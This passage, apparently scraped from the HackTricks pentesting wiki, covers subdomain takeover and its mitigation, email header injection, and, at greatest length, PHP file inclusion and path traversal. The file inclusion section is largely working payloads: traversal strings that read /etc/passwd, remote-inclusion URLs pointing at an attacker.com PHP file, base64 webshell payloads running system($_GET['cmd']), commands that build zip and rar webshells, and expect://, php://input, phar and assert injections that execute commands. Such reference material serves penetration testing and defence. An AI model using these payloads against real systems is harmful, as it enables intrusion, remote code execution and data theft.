2017, Arne also demonstrated similar attack vector against\nUber's SSO system\n.\nThe behavior explained above is not limited to cookies. Since Javascript scripts have full control over the websites, they are run on, having ability to replace such scripts on the legitimate website might lead to catastrophic consequences. Suppose that website is using Javascript code from the external provider using\nscript\ntag and\nsrc\nattribute. When the domain of external provider expires, the browser fails silently, i.e., it doesn't trigger any alerts visible to regular users. If the external code is not doing any important stuff (e.g., it is used only for tracking) such external provider might stay on the website for an extended period. An attacker can take over this expired domain, match the URL path of provided Javascript code and thus gain control over every visitor that visits the original website.\nThere is, however, one way of protecting the integrity of Javascript files in a browser.\nSubresource Integrity\nwas proposed\nas a mechanism to include cryptographic hash as an attribute\nintegrity\nto\nscript\ntag in HTML5. When the provided cryptographic hash does not match the download file, the browser refuses to execute it.\nE-mails\nWhen CNAME subdomain takeover is possible, MX records can be set up by an attacker to an arbitrary web server as well. It allows receiving e-mails to a legitimate subdomain of some brand - particularly useful again in (spear) phishing attacks where interaction between an attacker and victim is necessary. Attackers usually spoof\nReturn-Path\nheader to receive a reply to the e-mail. With correct MX records, this problem is bypassed.\nOn the other side, sending e-mails is also possible. Although it is trivial to spoof\nFrom\nheader to include any e-mail addresses, SPF filters are usually checking\nReturn-Path\nheader and allowed mail-sending hosts for the domain. SPF stores configuration in DNS TXT records. With subdomain takeover, TXT records are in control of attacker too - SPF checks can be passed easily.\nAs I noted in the beginning, these tactics usually don't work with majority of cloud providers since you don't have control over DNS zone directly.\nHigher Order Risks\nThe concept of subdomain takeover can be naturally extended to NS records: If the base domain of at least one NS record is available for registration, the source domain name is vulnerable to subdomain takeover.\nOne of the problems in subdomain takeover using NS record is that the source domain name usually has multiple NS records. Multiple NS records are used for redundancy and load balancing. The nameserver is chosen randomly before DNS resolution. Suppose that the domain\nsub.example.com\nhas two NS records:\nns.vulnerable.com\nand\nns.nonvulnerable.com\n. If an attacker takes over the\nns.vulnerable.com\n, the situation from perspective of the user who queries\nsub.example.com\nlooks as follows:\n1.\nSince there are two nameservers, one is randomly chosen. This means the probability of querying nameserver controlled by an attacker is 50%.\n2.\nIf user's DNS resolver chooses\nns.nonvulnerable.com\n(legitimate nameserver), the correct result is returned and likely being cached somewhere between 6 and 24 hours.\n3.\nIf user's DNS resolver chooses\nns.vulnerable.com\n(nameserver owned by an attacker), an attacker might provide a fake result which will also be cached. Since an attacker is in control of nameserver, she can set TTL for this particular result to be for example one week.\nThe process above is repeated every time the cache entry expires. When an attacker chooses to use TTL with high value, the fake result will stay in DNS cache for that period. During this time, all requests to\nsub.example.com\nwill use fake DNS result cached by an attacker. This idea is even amplified when public DNS resolvers (e.g., Google DNS) are used. In this case, public resolvers are likely to cache the fake results which means that all users using the same DNS resolver will obtain fake results until the cache is revoked.\nIn addition to control over the source domain name, control over all higher-level domains of source domain name is gained as well. That is because owning a canonical domain name of NS record means owning the full DNS zone of the source domain name.\nIn 2016, Matthew Bryant\ndemonstrated\na subdomain takeover using NS record on\nmaris.int\n. The .INT top-level domain is a special TLD, and the only handful of domains are using it. Bryant showed that even though registration of such domain names is approved exclusively by IANA, nameservers can be set to arbitrary domains. Since one of\nmaris.int\nnameservers was available for registration (\ncobalt.aliis.be\n), subdomain takeover was possible even on this restricted TLD.\nMatthew also\ndemonstrated\neven higher severity attack where he was able to gain control over nameserver of .IO top-level domain. Gaining control over .IO means controlling responses for all .IO domain names. In this case, one of .IO nameservers were\nns-a1.io\nwhich was available for registration. By registering\nns-a1.io\nBryant was able to receive DNS queries and control their responses for all .IO domains.\nMitigation\nThe mitigation strategies for domain names already vulnerable to subdomain takeover are rather straightforward:\nRemove the affected DNS record\n‚Äî The simplest solution is to remove the affected record from the DNS zone. This step is usually used if the organization concludes that the affected source domain name is no longer needed.\nClaim the domain name\n‚Äî This means registering the resource in particular cloud provider or a case of a regular Internet domain, repurchasing the expired domain.\nTo prevent subdomain takeover in the future, organizations should change the process of creating and destructing resources in their infrastructure. In case of resource creation, the DNS record creation has to be the\nlast step\nof this process. This condition prevents DNS record to be pointing to a non-existing domain at any point in time. For resource destruction, the opposite holds: DNS record needs to be removed as the\nfirst step\nin this process. Tools such as\naquatone\ninclude checks for subdomain takeover. The checks should be periodically performed by a security team of an organization to verify that there are no vulnerable domains. Processes for central collection of exposed domain names are often not efficient inside organizations (due to global teams, etc.) and external monitoring is usually the best way to go.\nMitigation strategy for cloud providers should be considered as well. Cloud services are not verifying the domain ownership. The reason behind this is primarily convenience. Cloud provider is not introducing any vulnerability by not verifying ownership of a source domain name. It is therefore up to the user to monitor its DNS records. Another reason is, that when cloud resource is removed, the user is usually no longer a customer of that service. The question cloud providers then ask themselves is: Why should we even care?\nProviders such as\nGitLab\nrealized that subdomain takeover is an issue and implemented a domain verification mechanism.\nSome parts of this post are excerpts from my\nMaster's Thesis\n.\nUntil next time!\n‚Äã\nPatrik\n‚Äã\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nJNDI - Java Naming and Directory Interface & Log4Shell\nNext\n- Pentesting Web\nEmail Injections\nLast modified\n2mo ago"
    },
    {
        "title": "Email Injections",
        "url": "https://book.hacktricks.xyz/pentesting-web/email-injections",
        "text": "Email Injections\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nInject in sent e-mail\nInject Cc and Bcc after sender argument\nFrom:\n[email¬†protected]\n%0ACc:\n[email¬†protected]\n,%0ABcc:\n[email¬†protected]\nThe message will be sent to the recipient and recipient1 accounts.\nInject argument\nFrom:\n[email¬†protected]\n%0ATo:\n[email¬†protected]\nThe message will be sent to the original recipient and the attacker account.\nInject Subject argument\nFrom:\n[email¬†protected]\n%0ASubject:This is%20Fake%20Subject\nThe fake subject will be added to the original subject and in some cases will replace it. It depends on the mail service behavior.\nChange the body of the message\nInject a two-line feed, then write your message to change the body of the message.\nFrom:\n[email¬†protected]\n%0A%0AMy%20New%20%0Fake%20Message.\nPHP mail() function exploitation\n# The function has the following definition:\n‚Äã\nphp\n--rf\nmail\n‚Äã\nFunction\n[\n<\ninternal:standard\n>\nfunction\nmail\n]\n{\n- Parameters\n[\n5\n]\n{\nParameter\n#0 [ <required> $to ]\nParameter\n#1 [ <required> $subject ]\nParameter\n#2 [ <required> $message ]\nParameter\n#3 [ <optional> $additional_headers ]\nParameter\n#4 [ <optional> $additional_parameters ]\n}\n}\nThe 5th parameter ($additional_parameters)\nThis section is going to be based on\nhow to abuse this parameter supposing that an attacker controls it\n.\nThis parameter is going to be added to the command line PHP will be using to invoke the binary sendmail. However, it will be sanitised with the function\nescapeshellcmd($additional_parameters)\n.\nAn attacker can\ninject extract parameters for sendmail\nin this case.\nDifferences in the implementation of /usr/sbin/sendmail\nsendmail\ninterface is\nprovided by the MTA email software\n(Sendmail, Postfix, Exim etc.) installed on the system. Although the\nbasic functionality\n(such as -t -i -f parameters) remains the\nsame\nfor compatibility reasons,\nother functions and parameters\nvary greatly depending on the MTA installed.\nHere are a few examples of different man pages of sendmail command/interface:\nSendmail MTA: http://www.sendmail.org/~ca/email/man/sendmail.html\nPostfix MTA: http://www.postfix.org/mailq.1.html\nExim MTA: https://linux.die.net/man/8/eximReferences\nDepending on the\norigin of the sendmail\nbinary different options have been discovered to abuse them and l\neak files or even execute arbitrary commands\n. Check how in\nhttps://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html\n‚Äã\nInject in the e-mail name\nIgnored parts of an email\nThe symbols:\n+, -\nand\n{}\nin rare occasions can be used for tagging and ignored by most e-mail servers\nE.g.\n[email¬†protected]\n‚Üí\n[email¬†protected]\nComments between parentheses ()\nat the beginning or the end will also be ignored\nE.g. john.doe(intigriti)@example.com ‚Üí\n[email¬†protected]\nWhitelist bypass\nQuotes\nIPs\nYou can also use IPs as domain named between square brackets:\njohn.doe@[127.0.0.1]\njohn.doe@[IPv6:2001:db8::1]\nOther vulns\nThird party SSO\nXSS\nSome services like\ngithub\nor\nsalesforce allows\nyou to create an\nemail address with XSS payloads on it\n. If you can\nuse this providers to login on other services\nand this services\naren't sanitising\ncorrectly the email, you could cause\nXSS\n.\nAccount-Takeover\nIf a\nSSO service\nallows you to\ncreate an account without verifying the given email address\n(like\nsalesforce\n) and then you can use that account to\nlogin in a different service\nthat\ntrusts\nsalesforce, you could access any account.\nNote that salesforce indicates if the given email was or not verified but so the application should take into account this info.\nReply-To\nYou can send an email using\nFrom: company.com\n** ** and\nReplay-To: attacker.com\nand if any\nautomatic reply\nis sent due to the email was sent\nfrom\nan\ninternal address\nthe\nattacker\nmay be able to\nreceive\nthat\nresponse\n.\nHard Bounce Rate\nSome applications like AWS have a\nHard Bounce Rate\n(in AWS is 10%), that whenever is overloaded the email service is blocked.\nA\nhard bounce\nis an\nemail\nthat couldn‚Äôt be delivered for some permanent reasons. Maybe the\nemail‚Äôs\na fake address, maybe the\nemail\ndomain isn‚Äôt a real domain, or maybe the\nemail\nrecipient‚Äôs server won‚Äôt accept\nemails\n) , that means from total of 1000 emails if 100 of them were fake or were invalid that caused all of them to bounce,\nAWS SES\nwill block your service.\nSo, if you are able to\nsend mails (maybe invitations) from the web application to any email address, you could provoke this block by sending hundreds of invitations to nonexistent users and domains: Email service DoS.\nReferences\n‚Äã\nhttps://resources.infosecinstitute.com/email-injection/\n‚Äã\n‚Äã\nhttps://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html\n‚Äã\n‚Äã\nhttps://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view\n‚Äã\n‚Äã\nhttps://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nPentesting Web -\nPrevious\nDomain/Subdomain takeover\nNext\n- Pentesting Web\nFile Inclusion/Path traversal\nLast modified\n2mo ago"
    },
    {
        "title": "File Inclusion/Path traversal",
        "url": "https://book.hacktricks.xyz/pentesting-web/file-inclusion",
        "text": "File Inclusion/Path traversal\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nFile Inclusion\nRemote File Inclusion (RFI):\nThe file is loaded from a remote server (Best: You can write the code and the server will execute it). In php this is\ndisabled\nby default (\nallow_url_include\n).\nLocal File Inclusion (LFI):\nThe sever loads a local file.\nThe vulnerability occurs when the user can control in some way the file that is going to be load by the server.\nVulnerable\nPHP functions\n: require, require_once, include, include_once\nA interesting tool to exploit this vulnerability:\nhttps://github.com/kurobeats/fimap\n‚Äã\nBlind - Interesting - LFI2RCE files\nwfuzz\n-\nc\n-\nw\n.\n/\nlfi2\n.\ntxt\n--\nhw\n0\nhttp\n:\n//\n10.10.10.10\n/\nnav\n.\nphp?page\n=\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/\nFUZZ\nLinux\nMixing several *nix LFI lists and adding more paths I have created this one:\nAuto_Wordlists/file_inclusion_linux.txt at main ¬∑ carlospolop/Auto_Wordlists\nGitHub\nTry also to change\n/\nfor\n\\\nTry also to add\n../../../../../\nA list that uses several techniques to find the file /etc/password (to check if the vulnerability exists) can be found\nhere\n‚Äã\nWindows\nMerging several lists I have created:\nAuto_Wordlists/file_inclusion_windows.txt at main ¬∑ carlospolop/Auto_Wordlists\nGitHub\nTry also to change\n/\nfor\n\\\nTry also to remove\nC:/\nand add\n../../../../../\nA list that uses several techniques to find the file /boot.ini (to check if the vulnerability exists) can be found\nhere\n‚Äã\nOS X\nCheck the LFI list of linux.\nBasic LFI and bypasses\nAll the examples are for Local File Inclusion but could be applied to Remote File Inclusion also (page=\nhttp://myserver.com/phpshellcode.txt\\\n.\nhttp://example.com/index.php?page=../../../etc/passwd\ntraversal sequences stripped non-recursively\nhttp\n:\n//\nexample\n.\ncom\n/\nindex\n.\nphp?page\n=\n....\n//\n....\n//\n....\n//\netc\n/\npasswd\nhttp\n:\n//\nexample\n.\ncom\n/\nindex\n.\nphp?page\n=\n....\n\\\n/\n....\n\\\n/\n....\n\\\n/\netc\n/\npasswd\nhttp\n:\n//\nsome\n.\ndomain\n.\ncom\n/\nstatic\n/%\n5c\n..\n%\n5c\n..\n%\n5c\n..\n%\n5c\n..\n%\n5c\n..\n%\n5c\n..\n%\n5c\n..\n%\n5c\n/\netc\n/\npasswd\nNull byte (%00)\nBypass the append more chars at the end of the provided string (bypass of: $_GET['param'].\"php\")\nhttp://example.com/index.php?page=../../../etc/passwd%00\nThis is\nsolved since PHP 5.4\nEncoding\nYou could use non-standard encondings like double URL encode (and others):\nhttp://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd\nhttp://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd\nhttp://example.com/index.php?page=%252e%252e%252fetc%252fpasswd\nhttp://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00\nFrom existent folder\nMaybe the back-end is checking the folder path:\nhttp\n:\n//\nexample\n.\ncom\n/\nindex\n.\nphp?page\n=\nutils\n/\nscripts\n/\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/\netc\n/\npasswd\nIdentifying folders on a server\nDepending on the applicative code / allowed characters, it might be possible to recursively explore the file system by discovering folders and not just files. In order to do so:\nidentify the \"depth\" of you current directory by succesfully retrieving\n/etc/passwd\n(if on Linux):\nhttp://example.com/index.php?page=../../../etc/passwd # depth of 3\ntry and guess the name of a folder in the current directory by adding the folder name (here,\nprivate\n), and then going back to\n/etc/passwd\n:\nhttp://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd\nif the application is vulnerable, there might be two different outcomes to the request:\nif you get an error / no output, the\nprivate\nfolder does not exist at this location\nif you get the content from\n/etc/passwd\n, you validated that there is indeed a\nprivate\nfolder in your current directory\nthe folder(s) you discovered using this techniques can then be fuzzed for files (using a classic LFI method) or for subdirectories using the same technique recursively.\nIt is possible to adapt this technique to find directories at any location in the file system. For instance, if, under the same hypothesis (current directory at depth 3 of the file system) you want to check if\n/var/www/\ncontains a\nprivate\ndirectory, use the following payload:\nhttp://example.com/index.php?page=../../../var/www/private/../../../etc/passwd\nThe following sequence of commands allows the generation of payloads using\nsed\n(1) as input for url fuzzing tools such as\nffuf\n(2):\n$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt\n$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr \"root\"\nOf course, adapt there payloads to your needs in terms of depth / location / input directory list.\nPath truncation\nBypass the append of more chars at the end of the provided string (bypass of: $_GET['param'].\"php\")\nIn PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.\nCheck if last 6 chars are passwd --> passwd/\nCheck if last 4 chars are \".php\" --> shellcode.php/.\nhttp://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\[ADD MORE]\\.\\.\nhttp://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.\n‚Äã\n#With the next options, by trial and error, you have to discover how many \"../\" are needed to delete the appended string but not \"/etc/passwd\" (near 2027)\n‚Äã\nhttp://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd\nhttp://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd\nAlways try to\nstart\nthe path\nwith a fake directory\n(a/).\nThis vulnerability was corrected in PHP 5.3.\nFilter bypass tricks\nhttp://example.com/index.php?page=....//....//etc/passwd\nhttp://example.com/index.php?page=..///////..////..//////etc/passwd\nhttp://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd\nMaintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd\nhttp://example.com/index.php?page=PhP://filter\nRemote File Inclusion\nIn php this is disable by default because\nallow_url_include\nis\nOff.\nIt must be\nOn\nfor it to work, and in that case you could include a PHP file from your server and get RCE:\nhttp\n:\n//\nexample\n.\ncom\n/\nindex\n.\nphp?page\n=\nhttp\n:\n//\natacker\n.\ncom\n/\nmal\n.\nphp\nhttp\n:\n//\nexample\n.\ncom\n/\nindex\n.\nphp?page\n=\n\\\\attacker\n.\ncom\\shared\\mal\n.\nphp\nIf for some reason\nallow_url_include\nis\nOn\n, but PHP is\nfiltering\naccess to external webpages,\naccording to this post\n, you could use for example the data protocol with base64 to decode a b64 PHP code and egt RCE:\nPHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt\nIn the previous code, the final\n+.txt\nwas added because the attacker needed a string that ended in\n.txt\n, so the string ends with it and after the b64 decode that part will return just junk and the real PHP code will be included (and therefore, executed).\nAnother example\nnot using the\nphp://\nprotocol\nwould be:\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt\nPython Root element\nIn python in a code like this one:\n# file_name is controlled by a user\nos\n.\npath\n.\njoin\n(\nos\n.\ngetcwd\n(),\n\"public\"\n,\nfile_name\n)\nIf the user passes an\nabsolute path\nto\nfile_name\n, the\nprevious path is just removed\n:\nos\n.\npath\n.\njoin\n(\nos\n.\ngetcwd\n(),\n\"public\"\n,\n\"/etc/passwd\"\n)\n'/etc/passwd'\nIt is the intended behaviour according to\nthe docs\n:\nIf a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.\nJava List Directories\nIt looks like if you have a Path Traversal in Java and you\nask for a directory\ninstead of a file, a\nlisting of the directory is returned\n. This won't be happening in other languages (afaik).\nTop 25 parameters\nHere‚Äôs list of top 25 parameters that could be vulnerable to local file inclusion (LFI) vulnerabilities (from\nlink\n):\n?cat={payload}\n?dir={payload}\n?action={payload}\n?board={payload}\n?date={payload}\n?detail={payload}\n?file={payload}\n?download={payload}\n?path={payload}\n?folder={payload}\n?prefix={payload}\n?include={payload}\n?page={payload}\n?inc={payload}\n?locate={payload}\n?show={payload}\n?doc={payload}\n?site={payload}\n?type={payload}\n?view={payload}\n?content={payload}\n?document={payload}\n?layout={payload}\n?mod={payload}\n?conf={payload}\nLFI / RFI using PHP wrappers & protocols\nphp://filter\nPHP filters allow perform basic\nmodification operations on the data\nbefore being it's read or written. There are 5 categories of filters:\n‚Äã\nString Filters\n:\nstring.rot13\nstring.toupper\nstring.tolower\nstring.strip_tags\n: Remove tags from the data (everything between \"<\" and \">\" chars)\nNote that this filter has disappear from the modern versions of PHP\n‚Äã\nConversion Filters\n‚Äã\nconvert.base64-encode\nconvert.base64-decode\nconvert.quoted-printable-encode\nconvert.quoted-printable-decode\nconvert.iconv.*\n: Transforms to a different encoding(\nconvert.iconv.<input_enc>.<output_enc>\n) . To get the\nlist of all the encodings\nsupported run in the console:\niconv -l\nAbusing the\nconvert.iconv.*\nconversion filter you can\ngenerate arbitrary text\n, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check\nLFI2RCE via php filters\n.\n‚Äã\nCompression Filters\n‚Äã\nzlib.deflate\n: Compress the content (useful if exfiltrating a lot of info)\nzlib.inflate\n: Decompress the data\n‚Äã\nEncryption Filters\n‚Äã\nmcrypt.*\n: Deprecated\nmdecrypt.*\n: Deprecated\nOther Filters\nRunning in php\nvar_dump(stream_get_filters());\nyou can find a couple of\nunexpected filters\n:\nconsumed\ndechunk\n: reverses HTTP chunked encoding\nconvert.*\n# String Filters\n## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd\necho\nfile_get_contents\n(\n\"php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd\"\n);\n## Same chain without the \"|\" char\necho\nfile_get_contents\n(\n\"php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd\"\n);\n## string.string_tags example\necho\nfile_get_contents\n(\n\"php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala\"\n);\n‚Äã\n# Conversion filter\n## B64 decode\necho\nfile_get_contents\n(\n\"php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=\"\n);\n## Chain B64 encode and decode\necho\nfile_get_contents\n(\n\"php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd\"\n);\n## convert.quoted-printable-encode example\necho\nfile_get_contents\n(\n\"php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=\"\n);\n=\nC2\n=\nA3hellooo\n=\n3\nD\n## convert.iconv.utf-8.utf-16le\necho\nfile_get_contents\n(\n\"php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=\"\n);\n‚Äã\n# Compresion Filter\n## Compress + B64\necho\nfile_get_contents\n(\n\"php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd\"\n);\nreadfile\n(\n'php://filter/zlib.inflate/resource=test.deflated'\n);\n#To decompress the data locally\n# note that PHP protocol is case-inselective (that's mean you can use \"PhP://\" and any other varient)\nThe part \"php://filter\" is case insensitive\nphp://fd\nThis wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:\necho\nfile_get_contents\n(\n\"php://fd/3\"\n);\n$myfile\n=\nfopen\n(\n\"/etc/passwd\"\n,\n\"r\"\n);\nYou can also use\nphp://stdin, php://stdout and php://stderr\nto access the\nfile descriptors 0, 1 and 2\nrespectively (not sure how this could be useful in an attack)\nzip:// and rar://\nUpload a Zip or Rar file with a PHPShell inside and access it.\nIn order to be able to abuse the rar protocol it\nneed to be specifically activated\n.\necho\n\"<pre><?php system(\n$_GET\n['cmd']); ?></pre>\"\n>\npayload.php\n;\nzip\npayload.zip payload.php\n;\nmv\npayload.zip shell.jpg\n;\nrm\npayload.php\n‚Äã\nhttp://example.com/index.php?page\n=\nzip://shell.jpg%23payload.php\n‚Äã\n# To compress with rar\nrar\na payload.rar payload.php\n;\nmv\npayload.rar shell.jpg\n;\nrm\npayload.php\nhttp://example.com/index.php?page\n=\nrar://shell.jpg%23payload.php\ndata://\nhttp://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents(\"index.php\")); ?>\nhttp://example.net/?page=data://text/plain,<?php phpinfo(); ?>\nhttp://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=\nhttp://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents(\"index.php\")); ?>\nhttp://example.net/?page=data:text/plain,<?php phpinfo(); ?>\nhttp://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=\nNOTE: the payload is \"<?php system($_GET['cmd']);echo 'Shell done !'; ?>\"\nFun fact: you can trigger an XSS and bypass the Chrome Auditor with :\nhttp://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\nNote that this protocol is restricted by php configurations\nallow_url_open\nand\nallow_url_include\nexpect://\nExpect has to be activated. You can execute code using this.\nhttp://example.com/index.php?page=expect://id\nhttp://example.com/index.php?page=expect://ls\ninput://\nSpecify your payload in the POST parameters\nhttp://example.com/index.php?page=php://input\nPOST DATA: <?php system('id'); ?>\nphar://\nA\n.phar\nfile can be also used to execute PHP code if the web is using some function like\ninclude\nto load the file.\ncreate_phar.php\n<\n?php\n$phar\n=\nnew Phar\n(\n'test.phar'\n);\n$phar\n->\nstartBuffering\n();\n$phar\n->\naddFromString\n(\n'test.txt'\n,\n'text'\n);\n$phar\n->\nsetStub\n(\n'<?php __HALT_COMPILER(); system(\"ls\"); ?>'\n);\n‚Äã\n$phar\n->\nstopBuffering\n();\nAnd you can compile the\nphar\nexecuting the following line:\nphp\n--define\nphar.readonly\n=\n0\ncreate_path.php\nA file called\ntest.phar\nwill be generated that you can use to abuse the LFI.\nIf the LFI is just reading the file and not executing the php code inside of it, for example using functions like\nfile_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()\n.\nYou can try to abuse a\ndeserialization\noccurring when\nreading\na\nfile\nusing the\nphar\nprotocol.\nFor more information read the following post:\nphar:// deserialization\nMore protocols\nCheck more possible\nprotocols to include here\n:\n‚Äã\nphp://memory and php://temp\n‚Äî Write in memory or in a temporary file (not sure how this can be useful in a file inclusion attack)\n‚Äã\nfile://\n‚Äî Accessing local filesystem\n‚Äã\nhttp://\n‚Äî Accessing HTTP(s) URLs\n‚Äã\nftp://\n‚Äî Accessing FTP(s) URLs\n‚Äã\nzlib://\n‚Äî Compression Streams\n‚Äã\nglob://\n‚Äî Find pathnames matching pattern (It doesn't return nothing printable, so not really useful here)\n‚Äã\nssh2://\n‚Äî Secure Shell 2\n‚Äã\nogg://\n‚Äî Audio streams (Not useful to read arbitrary files)\nLFI via PHP's 'assert'\nIf you encounter a difficult LFI that appears to be filtering traversal strings such as \"..\" and responding with something along the lines of \"Hacking attempt\" or \"Nice try!\", an 'assert' injection payload may work.\nA payload like this:\n' and die(show_source('/etc/passwd')) or '\nwill successfully exploit PHP code for a \"file\" parameter that looks like this:\nassert\n(\n\"strpos('\n$file\n', '..') === false\"\n)\nor die\n(\n\"Detected hacking attempt!\"\n);\nIt's also possible to get RCE in a vulnerable \"assert\" statement using the system() function:\n' and die(system(\"whoami\")) or '\nBe sure to URL-encode payloads before you send them.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nPHP 